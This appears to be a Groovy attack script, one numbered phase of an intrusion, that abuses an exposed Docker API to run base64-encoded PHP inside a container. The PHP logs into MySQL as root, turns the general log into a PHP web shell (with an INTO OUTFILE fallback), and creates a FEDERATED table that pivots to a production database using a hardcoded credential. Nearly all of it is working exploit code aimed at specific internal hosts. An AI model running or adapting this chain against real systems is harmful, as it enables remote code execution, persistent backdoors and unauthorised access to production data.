// Phase 19: General log RCE as root + verify + fix
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(60000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def php = '''<?php
error_reporting(E_ALL);
ini_set("display_errors","1");

$m = new mysqli("172.27.141.4", "root", "password", "", 3306);
if ($m->connect_error) { die("FAIL: ".$m->connect_error."\\n"); }
echo "ROOT CONNECTED\\n";

// Step 1: Check current state
$r = $m->query("SELECT @@general_log gl, @@general_log_file glf, @@log_output lo, @@datadir dd");
$row = $r->fetch_assoc();
echo "general_log=".$row["gl"]." file=".$row["glf"]." output=".$row["lo"]." datadir=".$row["dd"]."\\n";

// Step 2: Try writing to datadir (mysql definitely has write perms there)
$target = "/var/lib/mysql/rce_test2.php";
echo "\\n=== Attempting general_log to $target ===\\n";

$m->query("SET GLOBAL general_log = OFF");
echo "SET OFF: ".$m->error."\\n";

$m->query("SET GLOBAL general_log_file = '$target'");
echo "SET FILE: ".$m->error."\\n";

// Verify it was set
$r = $m->query("SELECT @@general_log_file glf");
$row = $r->fetch_assoc();
echo "VERIFIED: general_log_file=".$row["glf"]."\\n";

$m->query("SET GLOBAL general_log = ON");
echo "SET ON: ".$m->error."\\n";

// Execute the payload query
$m->query("SELECT '<?php echo shell_exec(\\$_GET[chr(99)]); ?>'");
echo "PAYLOAD QUERY: ".$m->error."\\n";

$m->query("SET GLOBAL general_log = OFF");
echo "SET OFF: ".$m->error."\\n";

// Restore
$m->query("SET GLOBAL general_log_file = '/var/lib/mysql/CSDEV01-2.log'");

// Verify file exists
$r = $m->query("SELECT LOAD_FILE('$target') c");
$row = $r->fetch_assoc();
if ($row["c"] && strlen($row["c"]) > 0) {
    echo "\\n*** FILE_WRITTEN *** ".strlen($row["c"])." bytes\\n";
    if (strpos($row["c"], "shell_exec") !== false) {
        echo "*** PHP_PAYLOAD_CONFIRMED ***\\n";
    }
    echo substr($row["c"], 0, 800)."\\n";
} else {
    echo "FILE_NOT_FOUND or empty\\n";
    // Try alternative: INTO OUTFILE directly with root
    echo "\\n=== FALLBACK: INTO OUTFILE as root ===\\n";
    $m->query("SELECT '<?php echo shell_exec(\\$_GET[chr(99)]); ?>' INTO OUTFILE '/tmp/root_rce.php'");
    echo "OUTFILE /tmp: ".$m->error."\\n";
    
    // Verify
    $r = $m->query("SELECT LOAD_FILE('/tmp/root_rce.php') c");
    $row = $r->fetch_assoc();
    if ($row["c"]) {
        echo "*** OUTFILE_OK *** ".strlen($row["c"])." bytes: ".$row["c"]."\\n";
    }
}

// Step 3: Final connectivity test from this MySQL session
echo "\\n=== FEDERATED TABLE PIVOT TO PROD ===\\n";
// Check if FEDERATED engine is available
$r = $m->query("SHOW ENGINES");
echo "Available engines:\\n";
while ($row = $r->fetch_assoc()) {
    if ($row["Support"] == "YES" || $row["Support"] == "DEFAULT") {
        echo "  ".$row["Engine"]." (".$row["Support"].")\\n";
    }
}

// Try creating a FEDERATED table pointing to PROD Sears
$m->query("CREATE DATABASE IF NOT EXISTS pivot_test");
$m->query("USE pivot_test");
$m->query("DROP TABLE IF EXISTS prod_check");
$sql = "CREATE TABLE prod_check (id INT) ENGINE=FEDERATED CONNECTION='mysql://apifincadob:nNzy]Ku2Ah=u%y1I@172.27.141.24:3308/tienda/pedidos'";
$m->query($sql);
echo "FEDERATED TABLE CREATE: ".$m->error."\\n";

// Try selecting from it
$r = @$m->query("SELECT COUNT(*) FROM pivot_test.prod_check");
if ($r) {
    $row = $r->fetch_row();
    echo "*** FEDERATED_PIVOT_TO_PROD_OK *** rows=".$row[0]."\\n";
} else {
    echo "FEDERATED_FAIL: ".$m->error."\\n";
}

$m->close();
echo "\\nPHASE19_DONE\\n";
'''

def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_p19.php && php /tmp/_p19.php 2>&1; rm -f /tmp/_p19.php"
println execIn(cmd)
